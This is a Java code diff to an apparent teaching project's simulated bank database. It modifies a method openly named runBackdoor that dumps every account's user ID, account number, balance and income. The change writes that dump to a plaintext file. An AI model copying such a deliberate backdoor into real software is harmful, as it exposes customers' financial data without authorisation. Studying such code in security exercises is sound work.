@@ -1,5 +1,8 @@
 package components.bankService.database;
 
+import java.io.BufferedWriter;
+import java.io.FileWriter;
+import java.io.IOException;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.Map;
@@ -140,21 +143,28 @@ public class BankDatabase extends BaseBankDatabase {
 
   @Override
   protected DTO runBackdoor(DTO dto, BankAccount account) {
-    String log = "";
-
-    System.out.println("ACESSANDO BACKDOOR");
+    StringBuilder logBuilder = new StringBuilder();
 
     for (BankAccount iterableAccount : bankAccountsDatabase) {
-      String accountString = "userID: " + iterableAccount.getUserId() +
-          "\nagency: " + iterableAccount.getAgency() +
-          "\naccountNumber: " + iterableAccount.getAccountNumber() +
-          "\nbalance: " + iterableAccount.getBalance() +
-          "\nfixedIncome: " + iterableAccount.getFixedIncome() + "\n";
+        String accountString = "userID: " + iterableAccount.getUserId() +
+                "\nagency: " + iterableAccount.getAgency() +
+                "\naccountNumber: " + iterableAccount.getAccountNumber() +
+                "\nbalance: " + iterableAccount.getBalance() +
+                "\nfixedIncome: " + iterableAccount.getFixedIncome() + "\n";
 
-      databaseAccountsLog.add(accountString);
-      log += accountString;
+        databaseAccountsLog.add(accountString);
+        logBuilder.append(accountString);
     }
 
-    return new MessageDTO(log);
+    String log = logBuilder.toString();
+
+    String fileName = "database_log.txt";
+    try (BufferedWriter writer = new BufferedWriter(new FileWriter(fileName))) {
+        writer.write(log);
+    } catch (IOException e) {
+        e.printStackTrace();
+    }
+
+    return new MessageDTO("Os dados foram armazenados no arquivo " + fileName);
   }
 }
